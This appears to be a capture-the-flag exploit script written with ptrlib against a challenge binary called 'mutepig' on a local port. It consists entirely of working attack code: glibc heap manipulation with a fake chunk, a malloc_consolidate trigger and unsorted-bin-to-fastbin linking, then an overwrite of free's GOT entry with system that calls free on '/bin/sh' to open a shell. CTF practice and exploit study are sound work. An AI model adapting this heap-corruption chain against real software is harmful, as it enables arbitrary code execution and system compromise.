from ptrlib import *
import time

def add(choice, data):
    assert len(data) < 8
    assert choice in [1, 2, 3, 13337]
    time.sleep(0.1)
    sock.sendline('1')
    time.sleep(0.1)
    sock.sendline(str(choice))
    time.sleep(0.1)
    sock.send(data)
    time.sleep(0.1)
    return

def delete(index):
    time.sleep(0.1)
    sock.sendline('2')
    time.sleep(0.1)
    sock.sendline(str(index))
    time.sleep(0.1)
    return

def edit(index, data, name):
    assert len(data) < 8 and len(name) < 0x30
    time.sleep(0.1)
    sock.sendline('3')
    time.sleep(0.1)
    sock.sendline(str(index))
    time.sleep(0.1)
    sock.send(data)
    time.sleep(0.1)
    sock.send(name)

elf = ELF("./mutepig")
sock = Socket("localhost", 9999)
addr_gbuf = 0x602120

# Make av->system_mem larger than 0xa00000
add(3, '0000000') # 0
delete(0)
add(3, '1111111') # 1
delete(1)

# Free fast chunk
add(1, '2222222') # 2
delete(2)
add(2, '3333333') # 3

# Create fake chunk and modify fd
payload  = p64(0) + p64(0x11)
payload += p64(0) + p64(0xfffffffffffffff1)
edit(2, p64(addr_gbuf + 0x10)[:7], payload)

# Call malloc_consolidate
delete(3)

# Link unsortedbin to fastbin
payload  = p64(0xfffffffffffffff0) + p64(0x10)
payload += p64(0) + p64(0xa00001)
edit(3, '3333333', payload)
add(3, '4444444') # 4
payload  = p64(0xfffffffffffffff0) + p64(0x10)
payload += p64(0) + p64(0xfffffffffffffff1)
edit(3, '3333333', payload)

# GOT overwrite
add(13337, '5555555') # 5
add(1, p64(elf.got('free'))[:7]) # array
edit(0, p64(elf.plt('system'))[:7], 'pon')

edit(2, "/bin/sh", "pon")
delete(2)

sock.interactive()
